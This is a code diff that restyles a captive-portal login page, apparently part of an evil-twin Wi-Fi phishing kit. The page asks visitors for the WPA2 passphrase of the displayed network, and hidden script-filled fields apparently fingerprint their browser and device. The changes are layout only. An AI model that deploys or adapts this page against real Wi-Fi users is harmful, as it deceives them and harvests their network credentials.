@@ -36,16 +36,18 @@ header("Expires: 0");
                         <h3 class="card-title text-center"><?= $ssid; ?></h3>
                         <p class="text-center small mb-5">It look’s like you need to be authorised to use this Wireless Access Point.</p>
                         <form method="POST" action="/captiveportal/index.php" onsubmit="submitForm()" target="login" id="loginForm">
-                            <div class="form-group text-left mb-4">
-                                <label for="password">Passphrase:</label>
-                                <div class="input-group">
-                                <input type="password" class="form-control" id="password" name="password" placeholder="WPA2 Passphrase" autocomplete="current-password" required>
-                                <div class="input-group-append">
-                                    <span class="input-group-text">
-                                        <i id="showPasswordIcon" class="bi bi-eye-fill" onclick="togglePassword()"></i>
-                                    </span>
+                            <div class="d-flex justify-content-center">
+                                <div class="form-group mb-4" style="width: 100%; max-width: 600px;">
+                                    <label for="password" class="d-block text-left">Passphrase:</label>
+                                    <div class="input-group">
+                                        <input type="password" class="form-control" id="password" name="password" placeholder="WPA2 Passphrase" autocomplete="current-password" required>
+                                        <div class="input-group-append">
+                                            <span class="input-group-text">
+                                                <i id="showPasswordIcon" class="bi bi-eye-fill" onclick="togglePassword()"></i>
+                                            </span>
+                                        </div>
+                                    </div>
                                 </div>
-                            </div>
                             </div>
                             <div id="loading-message" class="text-center mt-3 mb-3 font-weight-bold"></div>
                             <input type="hidden" name="ssid" value="<?=getClientSSID($_SERVER['REMOTE_ADDR']);?>">
@@ -59,7 +61,9 @@ header("Expires: 0");
                             <input type="hidden" id="AT" name="AT" value="">
                             <input type="hidden" id="CC" name="CC" value="">
                             <script type="text/javascript">GSR(); GOS(); GWB(); GAT(); GCC();</script>
-                            <button type="submit" class="btn btn-orange btn-block text-white">Login</button>
+                            <div class="d-flex justify-content-center">
+                                <button type="submit" class="btn btn-orange text-white">Login</button>
+                             </div>
                             <div class="form-group form-check text-left mt-2">
                             <input type="checkbox" class="form-check-input" id="ACLAllow" name="ACLAllow" value="0">
                             <label class="form-check-label" for="ACLAllow">Add MAC to ALC Allow List</label>
